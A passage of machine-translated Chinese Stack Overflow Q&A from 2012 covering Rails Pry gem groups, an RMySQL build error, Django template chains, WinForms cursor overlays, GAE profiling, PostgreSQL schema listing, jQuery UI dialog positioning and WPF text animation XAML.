  gem 'pry-doc'
  gem 'awesome_print'
end 
```

```
➔ 捆绑 exec rails 控制台
加载开发环境（Rails 3.2.3）
[1] 撬（主）>

```

如果我完全注释掉该组，则不会加载 pry。

这里发生了什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-22T18:18:27.337

因为 bundle 默认会包含所有组的所有 gem。要在没有特定组的情况下捆绑运行：

```
bundle install --without group_name 
```

此设置将被记住，直到您更改它，因此将来对捆绑安装或更新的任何调用都将在没有排除组的情况下运行。请参阅捆绑程序[文档](http://gembundler.com/groups.html)。

如果您按照[Pry wiki](https://github.com/pry/pry/wiki/Setting-up-Rails-or-Heroku-to-use-Pry)中的说明使用 Pry 代替 IRB，这意味着如果 Pry 完全可用，则将使用 Pry，并且仅在不可用时使用 IRB。因此，当您在捆绑包中运行带有 Pry 的控制台时，即使您要求一个您不希望它包含在其中的环境，它也会被调用。

要解决这个问题，它必须不在你的包中，然后当你运行时，`bundle exec rails console`你可以使用 irb 代替。

如果您想更轻松地在 Pry 和 IRB 之间来回切换，我建议不要对 Rails 进行猴子补丁以使用 IRB 而不是 Pry。只需将 Pry 留在您想要的组中并正常捆绑（pry 在捆绑包中），当您想使用 Pry 作为您的 rails 控制台调用时`pry -r ./config/environment`。有关示例，请参见[Railscast 。](http://railscasts.com/episodes/280-pry-with-rails)

# r - 安装 RMySQL 会出现错误 RS-MySQL.h:32:19: fatal error: mysql.h: No such file

> ID：10270616
> 
> 赞同：3
> 
> 时间：2012-04-22T18:04:16.143
> 
> 标签：r, rmysql

我尝试安装 RMySQL 库（R 版本 2.14.2，32 位 WinXP），但收到以下错误消息：

```
install.packages("D:/R/library/RMySQL_0.9-3.tar.gz",repos=NULL, type="source") 
```

...

```
RS-MySQL.h:32:19: fatal error: mysql.h: No such file or directory
compilation terminated.
make: *** [RS-MySQL.o] Error 1
ERROR: compilation failed for package 'RMySQL'
* removing 'C:/Dokumente und Einstellungen/Giordano/R/win-library/2.14/RMySQL'
Warning message:
In install.packages("D:/R/library/RMySQL_0.9-3.tar.gz", repos = NULL,  :
  installation of package 'D:/R/library/RMySQL_0.9-3.tar.gz' had non-zero exit status 
```

这只是包含错误消息的输出的一部分。我不明白这个消息，也许有人可以给我一些建议。感谢帮助。佐丹奴。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-22T21:44:39.263

R 找不到构建包所需的 MySQL 头文件。正如文档所述：

> 在安装 MySQL 二进制发行版时，您需要安装“C Include Files / Lib Files”作为 MySQL 安装的一部分。

解决方法是安装 MySQL 头文件。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-06-29T13:12:22.603

在这里可以找到一些安装 mysql 头库的指针：

[https://github.com/jeffreyhorner/RMySQL](https://github.com/jeffreyhorner/RMySQL)

（网站现在好像搬到这里了）

[http://biostat.mc.vanderbilt.edu/wiki/Main/RMySQL](http://biostat.mc.vanderbilt.edu/wiki/Main/RMySQL)

关键是在 R\etc 文件夹中有一个 Renviron.site 文件，并在从源代码编译之前将 libmysql.dll 放在正确的位置。

祝你好运。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-10-14T01:09:35.780

您将永远不会获得适用于 Windows 的 RMySQL 预编译二进制包，因为在安装它之前会检查 MySQL 路径和其他包含文件的有效性。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2015-04-11T14:56:08.443

我有同样的问题。我发现安装程序将临时文件放在我在 Rprofile.site 文件中编辑的默认工作目录中。当它试图随后使用这些文件（包括 mysql.h）时，它找不到它们。当我将 Rprofile.site 文件恢复为默认值时，一切正常。如果没有其他方法，希望这会有所帮助。

# database - 在模板中使用 Django 链如何？

> ID：10270618
> 
> 赞同：1
> 
> 时间：2012-04-22T18:04:30.760
> 
> 标签：database, django, templates

我使用链如下：

在views.py中

```
places_list = Place.objects.all().order_by('-datetimecreated')[:5]
events_list = Event.objects.all().order_by('-datetimecreated')[:5]
photos_list = Photo.objects.all().order_by('-datetimecreated')[:5]
result_list = list(chain(photos_list, places_list, events_list)) 
```

在模板文件中

```
 {% for item in result_list %}

        <a href="{% url view_place item.slug %}">{{item.title}}</a>

    {% endfor %} 
```

那是显示一个地方，但如何显示一个事件或照片？

```
 <a href="{% url view_event item.slug %}">{{item.title}}</a>
        <a href="{% url view_photo item.slug %}">{{item.caption}}</a> 
```

提前致谢 。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-22T18:23:48.240

我需要了解更多信息才能正确回答您的问题，但这里有一些想法可能会对您有所帮助。我假设`photos_list`和都是 Django 模型的不同类的所有对象`places_list`。`events_list`

**选项1：在每个类上定义一个确定对象类型的方法**

例如，`content_type`在每个模型上定义一个方法，如下所示：

```
class Photo(models.Model):
    def type(self):
        return 'photo' 
```

然后在你的模板中检查这个：

```
{% for item in result_list %}
    {% if item.type == "photo" %}
        ...
    {% elif item.type == "place" %}
        ...
    {% else %}
        ...
    {% end %}
{% endfor %} 
```

**选项 2：`render`在每个类上定义一个方法**

这可能更难看，但是您可以`render`在每个对象上定义一个方法，该方法返回您要为该对象吐出的完整 HTML。然后是在您的模板中执行此操作的情况：

```
{% for item in result_list %}
    {{ item.render }}
{% endfor %} 
```

**旁注：考虑继承**

听起来照片、地点和事件都可能出现在同一个提要中，因此它们可能共享一些共同的字段（如`posted_at`）。关于这一点，您需要考虑很多事情，因此最好查看[Django 文档中的模型继承](https://docs.djangoproject.com/en/dev/topics/db/models/#model-inheritance)。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-22T19:00:40.340

您可以为每个模型定义一个“代理”属性，然后您可以在模板中使用该属性。考虑这样的事情：

```
class Photo(models.Model):
    ... # fields etc.

    @property
    def url(self):
        ... # return reversed url now

    @property
    def caption(self):
        ... # same idea, access title/whatnot 
```

在模板中，它可能看起来像这样：

```
{% for item in item_list %}
    <a href="{{ item.url }}">{{ item.caption }}</a>
{% endfor %} 
```

# c# - 将鼠标指针处的较小图像叠加到 PictureBox 上

> ID：10270621
> 
> 赞同：0
> 
> 时间：2012-04-22T18:04:47.077
> 
> 标签：c#, winforms, overlay

我刚开始为 C# 应用程序开发 Winforms GUI，想知道以下是否可行？

我希望在图片框中显示一个大图像（很容易完成），然后当鼠标指针悬停在较大的图像上时，在鼠标位置的大图像上叠加第二个较小的图像。如果可能的话，我希望覆盖图像是部分透明的。

由于 GUI 设计处于早期阶段，我可以将其更改为 WPF，如果这会使我的要求变得更容易。

非常感谢，

安迪。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-22T19:09:42.830

这是 Winforms 中的一条线，只需更改 PictureBox.Cursor 属性：

```
 pictureBox1.Cursor = new Cursor(new MemoryStream(Properties.Resources.ExampleCursor)); 
```

如果您需要任意图像，则需要将位图转换为光标。一个小辅助函数来做到这一点：

```
using System.Reflection;
...
    private static Cursor CursorFromBitmap(Bitmap bmp) {
        var hicon = bmp.GetHicon();
        var cursor = new Cursor(hicon);
        var fi = typeof(Cursor).GetField("ownHandle", BindingFlags.NonPublic | BindingFlags.Instance);
        fi.SetValue(cursor, true);
        return cursor;
    } 
```

使用一些反射技巧来避免必须跟踪句柄并明确销毁它。像这样使用它：

```
 pictureBox1.Cursor = CursorFromBitmap(Properties.Resources.ExampleImage); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-22T18:10:07.653

这在 WPF 中是微不足道的；只需`<Image>`在`<Canvas>`.

在 WinForms 中，您需要自己处理 PictureBox 的`Paint`事件并绘制图像。

# python - 在运行 Python 2.7 的 Google App Engine 中获取 Thread.Lock 需要 50% 的响应时间

> ID：10270625
> 
> 赞同：6
> 
> 时间：2012-04-22T18:04:53.040
> 
> 标签：python, multithreading, performance, google-app-engine, python-2.7

我在 GAE 上使用 python27 并希望减少应用程序的响应时间。

根据 cProfile 的说法，运行 160 万次函数调用需要 40 秒（显然太长）（似乎非常高）。我现在能找到的唯一线索是“{method 'acquire' of 'thread.lock' objects}”占用了 40 秒中的 20 秒。（注意：在 app.yaml 中将 threadsafe 设置为 false 或 true 似乎没有太大的影响。）

关于我哪里出错或下一步要调查哪里的任何想法？我知道获取锁所花费的大量时间可能只是症状而不是原因，但如果是这样的话，我怎样才能找到根本原因？在 cProfile 中为我的函数列出的所有其他时间和 ncall 似乎都是合理的。

我还想知道这是否是由于 2011 年底 GAE 与 2.7 的性能问题：

*   [https://groups.google.com/forum/?fromgroups#!topic/google-appengine/jMah6aWfZWg](https://groups.google.com/forum/?fromgroups#!topic/google-appengine/jMah6aWfZWg)
*   [https://code.google.com/p/googleappengine/issues/detail?id=6323](https://code.google.com/p/googleappengine/issues/detail?id=6323)
*   [Appengine，python27的性能下降](https://stackoverflow.com/questions/8341112/appengine-performance-degradation-with-python27)

作为参考，这里是一个示例 cProfile 输出（删除了行）：

```
Profile data:
1662549 function calls (1652247 primitive calls) in 39.545 seconds
Ordered by: cumulative time
ncalls  tottime  percall  cumtime  percall filename:lineno(function)
[lines removed]
10816   19.245    0.002   19.245    0.002 {method 'acquire' of 'thread.lock' objects}
[lines removed] 
```

提前感谢您提供的任何帮助！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-22T23:39:01.537

如果您的应用程序非常繁重 RPC（对 datastore/urlfetch/etc 进行长时间调用），那么您会注意到在 thread.lock.acquire() 中等待大量时间。

您可能希望在您的应用程序中启用[AppStats](https://developers.google.com/appengine/docs/python/tools/appstats)，并查看每个 rpc 需要多长时间。

# postgresql - 如何在 db 中有两个方案的同时显示 PostgreSql 中的所有表？

> ID：10270627
> 
> 赞同：1
> 
> 时间：2012-04-20T00:58:28.113
> 
> 标签：postgresql

中有2个方案`my_db`。我需要显示所有表的名称`scheme_one`。怎么做？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T06:26:15.743

您可以使用 PostgreSQL 的[信息模式](http://www.postgresql.org/docs/current/interactive/information-schema.html)，如下所示：

```
select table_name from information_schema.tables where table_schema = 'scheme_one'; 
```

# jquery - UI 对话框 - pageX pageY 位置

> ID：10270636
> 
> 赞同：0
> 
> 时间：2012-04-22T18:06:21.603
> 
> 标签：jquery, jquery-ui

我已经构建了一个包含许多数据行（超过 300 个表行）的数据页。在每一行中，我都有一个图像触发一个包含 HTML（上下文类型菜单）的小 ui 对话框。如果我单击任何视口中的触发图像，则没有问题。如果我向下滚动并单击触发图像，则 ui 始终与我的页面底部对齐，而不是我单击的元素。

```
function showMenu(){
$("#modalMenu").dialog("open");
return false;
}
$(document).ready(function() {
$('#modalMenu').dialog({autoOpen: false,modal: true,height: 200,width: 200});
$('.menu').click(function(e){$('#modalMenu').dialog('option', 'position', [e.pageX,e.pageY]);});
$('.menu').click(function(){showMenu();});
});

<div id="modalMenu">
  <a href="">Do Something</a>
  <a href="">Do Something Else</a>
</div>

<img class="menu" src="images/menu trigger.jpg" />

** This image is in the first cell of every row 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-23T12:19:28.387

弄清楚了。需要捕获scrollTop，然后从e.pageY中扣除。这说明了滚动后的位置。

```
$('.menu').click(function(e){
  var y=$(window).scrollTop(); 
  $('#modalMenu').dialog('option', 'position', [e.pageX,(e.pageY-y)]);
  }); 
```

# wpf - 试图在 wpf 中为文本设置动画，就像它是手写出来的一样

> ID：10270639
> 
> 赞同：1
> 
> 时间：2012-04-22T18:06:48.373
> 
> 标签：wpf, animation, text, handwriting

我正在尝试使用 Blend 为文本设置动画，因此文本块的可见性将以看起来像是手写的方式出现。我尝试创建一个故事板，然后将我的文本块转换为路径，然后将其转换回来并开始使用新故事板上关键帧处的路径点并展开间距。问题是，它看起来不是很自然。有没有不同的方法可以做到这一点，所以看起来有人以更自然的方式手写文本

```
 <UserControl xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"         xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" xmlns:d="http://schemas.microsoft.com/expression/blend/2008" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:ec="http://schemas.microsoft.com/expression/2010/controls" mc:Ignorable="d"
x:Class="ControlLibrary.mScrapeBottomIntro"
x:Name="UserControl"
d:DesignWidth="640" d:DesignHeight="480">
<UserControl.Resources>
    <Storyboard x:Key="mScrapeAnimation">
        <ObjectAnimationUsingKeyFrames Storyboard.TargetProperty="(UIElement.Visibility)" Storyboard.TargetName="path">
            <DiscreteObjectKeyFrame KeyTime="0:0:0.2" Value="{x:Static Visibility.Visible}"/>
        </ObjectAnimationUsingKeyFrames>
        <ObjectAnimationUsingKeyFrames Storyboard.TargetProperty="(UIElement.Visibility)" Storyboard.TargetName="path1">
            <DiscreteObjectKeyFrame KeyTime="0:0:0.5" Value="{x:Static Visibility.Visible}"/>
        </ObjectAnimationUsingKeyFrames>
        <ObjectAnimationUsingKeyFrames Storyboard.TargetProperty="(UIElement.Visibility)" Storyboard.TargetName="path2">
            <DiscreteObjectKeyFrame KeyTime="0:0:1" Value="{x:Static Visibility.Visible}"/>
        </ObjectAnimationUsingKeyFrames>
        <ObjectAnimationUsingKeyFrames Storyboard.TargetProperty="(UIElement.Visibility)" Storyboard.TargetName="path3">
            <DiscreteObjectKeyFrame KeyTime="0:0:1.5" Value="{x:Static Visibility.Visible}"/>
        </ObjectAnimationUsingKeyFrames>
        <ObjectAnimationUsingKeyFrames Storyboard.TargetProperty="(UIElement.Visibility)" Storyboard.TargetName="path4">
            <DiscreteObjectKeyFrame KeyTime="0:0:2" Value="{x:Static Visibility.Visible}"/>
        </ObjectAnimationUsingKeyFrames>
    </Storyboard>
</UserControl.Resources>
<UserControl.Triggers>
    <EventTrigger RoutedEvent="FrameworkElement.Loaded">
        <BeginStoryboard Storyboard="{StaticResource mScrapeAnimation}"/>
    </EventTrigger>
</UserControl.Triggers>

<Grid x:Name="LayoutRoot">
    <Path x:Name="path" Data="M15.445302,-1.9852335E-23 C15.679676,-1.9852335E-23 15.871082,0.11718692 16.019521,0.35156122 C16.167958,0.58593649 16.285145,0.89062247 16.371083,1.2656187 C16.45702,1.6406187 16.51952,2.0585854 16.558583,2.5195187 C16.597645,2.9804558 16.617176,3.4296723 16.617176,3.8671682 C16.617176,4.1171689 16.61327,4.3554489 16.605458,4.5820084 C16.597645,4.8085717 16.585927,5.0234144 16.570302,5.2265364 C17.226551,5.0702891 17.894519,4.9101337 18.574206,4.7460701 C19.253894,4.5820103 19.910143,4.4218549 20.542955,4.2656037 C21.175767,4.1093564 21.769517,3.9609197 22.324204,3.8202935 C22.878891,3.6796711 23.35936,3.5546717 23.765609,3.4452953 C24.609357,3.2265483 25.347638,3.0234243 25.980452,2.8359234 C26.613262,2.6484262 27.15623,2.4843645 27.609357,2.3437383 C28.06248,2.2031159 28.441386,2.0898352 28.746075,2.0038963 C29.05076,1.9179611 29.289041,1.8749926 29.460918,1.8749907 C29.820291,1.8749926 30.062478,1.9257736 30.18748,2.0273336 C30.312478,2.1288975 30.374978,2.3124904 30.37498,2.5781121 C30.374978,2.8749876 30.101541,3.2304546 29.554668,3.6445131 C29.007792,4.0585754 28.304667,4.4960732 27.445294,4.9570065 C26.585918,5.4179437 25.621075,5.8788789 24.550765,6.3398121 C23.480453,6.8007493 22.417954,7.2226222 21.363267,7.6054308 C20.30858,7.9882433 19.316393,8.3163667 18.386707,8.5898009 C17.45702,8.8632371 16.703114,9.0390174 16.124989,9.1171421 C16.046863,10.070262 15.984363,11.085882 15.937489,12.164002 C15.890614,13.242121 15.855457,14.288991 15.832021,15.304611 C15.808582,16.320231 15.789051,17.25382 15.773427,18.105379 C15.757801,18.956937 15.749989,19.624902 15.74999,20.109275 C15.749989,21.906141 15.835926,23.581914 16.007802,25.136593 C16.179677,26.691273 16.371083,28.070173 16.58202,29.273292 C16.792958,30.476411 16.984364,31.472499 17.156239,32.261558 C17.328114,33.050617 17.414051,33.577958 17.414051,33.843581 C17.414051,34.265454 17.351551,34.640452 17.226551,34.968576 C17.101551,35.296699 16.843739,35.460761 16.453114,35.460761 C16.078114,35.460761 15.671864,35.148262 15.234365,34.523265 C14.796864,33.898269 14.382802,32.960773 13.992178,31.710779 C13.601552,30.460786 13.277334,28.910012 13.019523,27.058459 C12.761709,25.206906 12.632803,23.04676 12.632804,20.578022 C12.632803,19.828026 12.648428,19.019436 12.679679,18.152253 C12.710928,17.28507 12.749991,16.390543 12.796866,15.468673 C12.84374,14.546802 12.90624,13.613213 12.984366,12.667906 C13.06249,11.722598 13.148428,10.796821 13.242179,9.8905757 C11.632805,10.296824 10.109368,10.613228 8.6718691,10.83979 C7.2343696,11.066351 5.9609329,11.179632 4.8515591,11.179632 C4.1484346,11.179632 3.5039035,11.081976 2.9179664,10.886664 C2.3320295,10.691353 1.8203109,10.460885 1.3828115,10.195262 C0.94531162,9.929638 0.60546809,9.6483894 0.36328051,9.3515159 C0.12109341,9.0546424 -2.6449501E-07,8.8124561 4.3328661E-13,8.624957 C-2.6449501E-07,8.2499608 0.12499965,7.9804309 0.37499958,7.8163673 C0.62499933,7.6523075 0.9765616,7.5702767 1.4296861,7.5702748 C2.1484358,7.5702767 2.9648416,7.5273081 3.8789037,7.4413692 C4.7929654,7.355434 5.7773397,7.2382471 6.8320266,7.0898084 C7.8867129,6.9413736 8.9960877,6.761687 10.160149,6.5507486 C11.324211,6.3398141 12.515617,6.1093465 13.734366,5.8593458 C13.84374,5.0156019 13.96874,4.2343558 14.109366,3.5156075 C14.24999,2.796863 14.394521,2.1796785 14.542959,1.6640542 C14.691396,1.1484337 14.839833,0.74218571 14.988271,0.44531028 C15.136708,0.14843676 15.289051,-1.9852335E-23 15.445302,-1.9852335E-23 z" Fill="Black" HorizontalAlignment="Left" Margin="129.953,222.14,0,222.399" RenderTransformOrigin="6.72915648883858,0.654329162094918" Stretch="Fill" Width="30.375" d:LayoutOverrides="HorizontalAlignment" Visibility="Hidden">
        <Path.RenderTransform>
            <TransformGroup>
                <ScaleTransform/>
                <SkewTransform/>
                <RotateTransform/>
                <TranslateTransform/>
            </TransformGroup>
        </Path.RenderTransform>
    </Path>
    <Path x:Name="path1" Data="M15.398426,4.4025168E-07 C14.710926,4.4025168E-07 13.933583,0.10156243 13.066396,0.30468642 C12.199209,0.50781041 11.289053,0.79687147 10.335929,1.1718696 C9.3828045,1.5468677 8.4140552,1.9999905 7.4296808,2.5312378 C6.4453064,3.0624852 5.4960883,3.6562322 4.5820264,4.3124789 C3.6679645,4.9687257 2.8164025,5.6796596 2.0273424,6.4452808 C1.2382804,7.210902 0.56249964,8.0155855 -3.5527132E-15,8.8593313 C1.4062491,8.5624578 2.80859,8.2030846 4.2070266,7.7812117 C5.6054632,7.3593388 6.9413999,6.9101222 8.2148365,6.4335621 C9.4882732,5.957002 10.671866,5.464817 11.765615,4.957007 C12.859365,4.449197 13.808583,3.9609182 14.61327,3.4921705 C15.417957,3.0234229 16.046863,2.5820188 16.499987,2.1679584 C16.953112,1.7538979 17.179674,1.398431 17.179674,1.1015574 C17.179674,0.83593377 17.019518,0.58593502 16.699206,0.35156119 C16.378894,0.11718736 15.9453,4.4025168E-07 15.398426,4.4025168E-07 z" Fill="Black" HorizontalAlignment="Left" Margin="159.506,233.952,0,237.188" RenderTransformOrigin="10.1774278243034,1.2857142933418" Stretch="Fill" Width="17.18" d:LayoutOverrides="HorizontalAlignment" Visibility="Hidden">
        <Path.RenderTransform>
            <TransformGroup>
                <ScaleTransform/>
                <SkewTransform/>
                <RotateTransform/>
                <TranslateTransform/>
            </TransformGroup>
        </Path.RenderTransform>
    </Path>
    <Path x:Name="path2" Data="M19.593736,-2.4815418E-24 C20.406236,-2.4815418E-24 21.101548,0.082030841 21.679672,0.24609252 C22.257797,0.41015421 22.726547,0.63671558 23.085921,0.92577664 C23.445296,1.2148377 23.710921,1.5546798 23.882796,1.9453028 C24.054671,2.3359259 24.140608,2.7577988 24.140608,3.2109215 C24.140608,3.9765427 23.796859,4.7734137 23.109359,5.6015346 C22.421859,6.4296555 21.523422,7.2343389 20.414048,8.015585 C19.304674,8.7968312 18.062487,9.5351087 16.687488,10.230418 C15.312489,10.925727 13.933584,11.535099 12.550772,12.058534 C11.16796,12.581969 9.8593675,12.996029 8.6249933,13.300715 C7.3906191,13.605401 6.3593717,13.757744 5.5312472,13.757744 C5.0781225,13.757744 4.6992165,13.61712 4.3945292,13.335871 C4.0898419,13.054622 3.8906233,12.734312 3.7968733,12.374938 C3.3124987,13.468683 3.0703113,14.523365 3.0703113,15.538985 C3.0703113,16.085857 3.160155,16.605386 3.3398424,17.097571 C3.5195298,17.589756 3.8124983,18.019441 4.2187481,18.386627 C4.6249978,18.753813 5.1601537,19.042874 5.8242158,19.25381 C6.4882779,19.464747 7.3046817,19.570215 8.273431,19.570215 C9.6640551,19.570215 11.070304,19.382716 12.492178,19.007718 C13.914052,18.63272 15.30077,18.132722 16.652332,17.507725 C18.003894,16.882728 19.300768,16.156169 20.542954,15.328049 C21.785141,14.499928 22.921859,13.624932 23.953108,12.703062 C24.343733,12.359313 24.632795,12.187439 24.820295,12.187439 C24.976545,12.187439 25.05467,12.289001 25.05467,12.492125 C25.05467,12.663999 24.996076,12.894467 24.878889,13.183528 C24.761702,13.472589 24.58592,13.765556 24.351546,14.06243 C23.882796,14.656177 23.312484,15.292893 22.640609,15.972577 C21.968735,16.652261 21.226548,17.328039 20.414048,17.99991 C19.601549,18.671782 18.722643,19.31631 17.777331,19.933494 C16.832019,20.550679 15.851551,21.097551 14.835927,21.574111 C13.820302,22.050671 12.773428,22.429576 11.695304,22.710824 C10.61718,22.992073 9.5390552,23.132697 8.4609309,23.132697 C7.4921816,23.132697 6.5039028,23.01551 5.496091,22.781136 C4.4882792,22.546763 3.5781235,22.167858 2.765624,21.644423 C1.9531245,21.120988 1.2890625,20.433492 0.7734378,19.581934 C0.25781314,18.730375 8.049478E-07,17.687412 8.049478E-07,16.453043 C8.049478E-07,14.999925 0.32812559,13.58587 0.98437517,12.210877 C1.6406247,10.835883 2.5039054,9.539015 3.5742172,8.320271 C4.6445291,7.1015271 5.8710908,5.9843452 7.2539005,4.9687252 C8.6367121,3.9531053 10.05468,3.0742034 11.507804,2.3320196 C12.960928,1.5898358 14.390615,1.0156199 15.796864,0.60937196 C17.203113,0.20312399 18.468737,-2.4815418E-24 19.593736,-2.4815418E-24 z" Fill="Black" HorizontalAlignment="Left" Margin="154.842,231.937,0,224.93" RenderTransformOrigin="7.16469087632011,0.579533895579611" Stretch="Fill" Width="25.055" d:LayoutOverrides="HorizontalAlignment" Visibility="Hidden">
        <Path.RenderTransform>
            <TransformGroup>
                <ScaleTransform/>
                <SkewTransform/>
                <RotateTransform/>
                <TranslateTransform/>
            </TransformGroup>
        </Path.RenderTransform>
    </Path>
    <Path x:Name="path3" Data="M16.03124,1.1563877E-07 C16.31249,1.1563877E-07 16.566396,0.058593574 16.792959,0.17578049 C17.019521,0.29296741 17.210927,0.4335917 17.367177,0.59765339 C17.523427,0.76171507 17.644521,0.94140167 17.730458,1.1367132 C17.816396,1.3320247 17.859364,1.4999926 17.859364,1.6406169 C17.859364,1.9687403 17.777333,2.2265515 17.613271,2.4140506 C17.449208,2.6015496 17.09374,2.7421739 16.546865,2.8359235 C15.765616,2.9765478 14.914054,3.1992029 13.992179,3.5038889 C13.070305,3.8085749 12.140618,4.1601356 11.203119,4.5585711 C10.265619,4.9570067 9.347651,5.3984107 8.4492141,5.8827833 C7.5507772,6.3671559 6.7265589,6.8710596 5.9765594,7.3944945 C5.2265599,7.9179294 4.5820291,8.4413643 4.0429669,8.9647992 C3.5039048,9.4882341 3.1328113,9.9921378 2.9296864,10.47651 C3.4609361,10.335886 4.2421856,10.140575 5.2734349,9.8905758 C6.3046842,9.6405771 7.4648397,9.3944845 8.7539014,9.1522982 C10.042963,8.910112 11.386712,8.7030817 12.785149,8.5312076 C14.183585,8.3593334 15.515616,8.2733964 16.78124,8.2733964 C18.781239,8.2733964 20.249988,8.6171447 21.187487,9.3046412 C22.124986,9.9921378 22.593736,11.039008 22.593736,12.445251 C22.593736,13.382746 22.359361,14.273366 21.890612,15.117112 C21.421862,15.960858 20.792956,16.757729 20.003894,17.507725 C19.214832,18.257722 18.304676,18.956937 17.273427,19.605371 C16.242178,20.253805 15.164053,20.843646 14.039054,21.374894 C12.914055,21.906141 11.777337,22.374889 10.6289,22.781137 C9.4804634,23.187385 8.3984329,23.531133 7.3828085,23.812381 C6.3671842,24.09363 5.4570285,24.308473 4.6523415,24.456909 C3.8476546,24.605346 3.2187487,24.679565 2.765624,24.679565 C2.3906243,24.679565 2.0859369,24.585815 1.8515621,24.398316 C1.6171873,24.210817 1.4374999,23.988162 1.3124999,23.730351 C1.1875,23.472539 1.1054688,23.203009 1.0664064,22.921761 C1.0273439,22.640512 1.0078126,22.398326 1.0078126,22.195202 C1.0078126,21.788954 1.1328126,21.542861 1.3828124,21.456924 C1.6328122,21.370987 1.9999995,21.328019 2.4843742,21.328019 C3.4843735,21.328019 4.6249978,21.195207 5.906247,20.929583 C7.1874961,20.66396 8.4882766,20.304586 9.8085882,19.851464 C11.1289,19.398341 12.421868,18.867094 13.687492,18.257722 C14.953116,17.64835 16.078115,16.999915 17.06249,16.312419 C18.046864,15.624922 18.839832,14.921801 19.441394,14.203054 C20.042957,13.484308 20.343738,12.781186 20.343738,12.09369 C20.343738,11.453068 20.074207,10.992133 19.535144,10.710884 C18.996082,10.429636 18.031239,10.289011 16.640615,10.289011 C14.999991,10.289011 13.402336,10.410104 11.847649,10.652291 C10.292963,10.894477 8.8554638,11.164007 7.5351522,11.46088 C6.2148405,11.757754 5.03906,12.027284 4.0078107,12.26947 C2.9765614,12.511657 2.1640619,12.63275 1.5703123,12.63275 C1.3515624,12.63275 1.1484376,12.597594 0.96093768,12.527281 C0.7734378,12.456969 0.6093754,12.339782 0.46875049,12.175721 C0.32812558,12.011659 0.21484441,11.789004 0.12890696,11.507755 C0.042969519,11.226507 7.9676558E-07,10.867133 7.9676558E-07,10.429636 C7.9676558E-07,9.9140132 0.17968818,9.3671409 0.53906295,8.7890188 C0.89843772,8.2108967 1.3789062,7.6288683 1.9804683,7.0429338 C2.5820304,6.4569992 3.2851549,5.8749708 4.0898419,5.2968487 C4.8945289,4.7187266 5.7382783,4.1679481 6.6210903,3.6445132 C7.5039022,3.1210783 8.4062454,2.6367057 9.3281198,2.1913954 C10.249994,1.7460852 11.1289,1.3632746 11.964837,1.0429637 C12.800774,0.72265276 13.570305,0.46874778 14.273429,0.28124871 C14.976554,0.093749648 15.562491,1.1563877E-07 16.03124,1.1563877E-07 z" Fill="Black" HorizontalAlignment="Left" Margin="181.397,230.765,0,224.555" RenderTransformOrigin="6.76973666262973,0.590693262284116" Stretch="Fill" Width="22.594" d:LayoutOverrides="HorizontalAlignment" Visibility="Hidden">
        <Path.RenderTransform>
            <TransformGroup>
                <ScaleTransform/>
                <SkewTransform/>
                <RotateTransform/>
                <TranslateTransform/>
            </TransformGroup>
        </Path.RenderTransform>
    </Path>
    <Path x:Name="path4" Data="M9.2109315,2.8709165E-08 C9.3515565,2.8709165E-08 9.5195251,0.078124639 9.7148375,0.23437386 C9.9101498,0.39062308 10.089837,0.60155953 10.2539,0.86718321 C10.417962,1.1328069 10.558587,1.4570259 10.675774,1.8398346 C10.792962,2.2226471 10.851555,2.6328013 10.851555,3.0702972 C10.851555,3.5234219 10.839837,4.1991998 10.816399,5.0976309 C10.792962,5.9960658 10.765618,6.964811 10.734368,8.0038664 C10.703118,9.0429237 10.675774,10.066356 10.652337,11.074164 C10.628899,12.081971 10.617181,12.913998 10.617181,13.570245 L10.617181,13.828056 C11.67968,13.734307 12.511711,13.663994 13.113273,13.61712 C13.714835,13.570245 14.183585,13.531183 14.519522,13.499933 C14.855459,13.468683 15.109365,13.449152 15.28124,13.441339 C15.453115,13.433527 15.640615,13.429621 15.84374,13.429621 C16.609364,13.429621 17.20702,13.605401 17.636707,13.956962 C18.066395,14.308522 18.281238,14.679614 18.281238,15.070237 C18.281238,15.429611 18.140613,15.667891 17.859363,15.785078 C17.578114,15.902265 17.078114,16.015545 16.359364,16.12492 C16.21874,16.156169 15.976552,16.195232 15.632802,16.242107 C15.289053,16.288981 14.863272,16.347575 14.355459,16.417887 C13.847647,16.488199 13.273429,16.562417 12.632804,16.640542 C11.99218,16.718667 11.30468,16.804604 10.570306,16.898353 C10.539056,17.804599 10.503899,18.800688 10.464837,19.88662 C10.425775,20.972552 10.386712,22.074109 10.34765,23.191291 C10.308587,24.308473 10.269525,25.406123 10.230462,26.484243 C10.1914,27.562363 10.156243,28.546733 10.124993,29.437353 C10.093743,30.327974 10.070306,31.089689 10.054681,31.722498 C10.039056,32.355308 10.031244,32.788899 10.031244,33.023273 C10.031244,33.882644 9.8671811,34.495922 9.5390563,34.863108 C9.2109315,35.230293 8.7499943,35.413886 8.1562447,35.413886 C8.0156198,35.413886 7.8945261,35.292793 7.7929637,35.050607 C7.6914013,34.80842 7.6093701,34.476391 7.5468701,34.054518 C7.4843702,33.632645 7.4414014,33.14046 7.417964,32.577963 C7.3945265,32.015465 7.3828077,31.406093 7.3828077,30.749847 C7.3828077,29.437353 7.4101515,28.230328 7.4648389,27.128771 C7.5195264,26.027214 7.5859326,24.953001 7.6640575,23.906131 C7.7421825,22.859261 7.8124949,21.79286 7.8749949,20.706928 C7.9374949,19.620996 7.9843698,18.445221 8.0156198,17.179602 C7.656245,17.210852 7.277339,17.249914 6.8789018,17.296789 C6.4804646,17.343664 6.0898398,17.386632 5.7070276,17.425694 C5.3242153,17.464757 4.957028,17.496007 4.6054658,17.519444 C4.2539035,17.542881 3.9374975,17.5546 3.6562476,17.5546 C2.8437482,17.5546 2.1992173,17.437413 1.7226551,17.203039 C1.2460929,16.968665 0.87890568,16.699136 0.62109335,16.39445 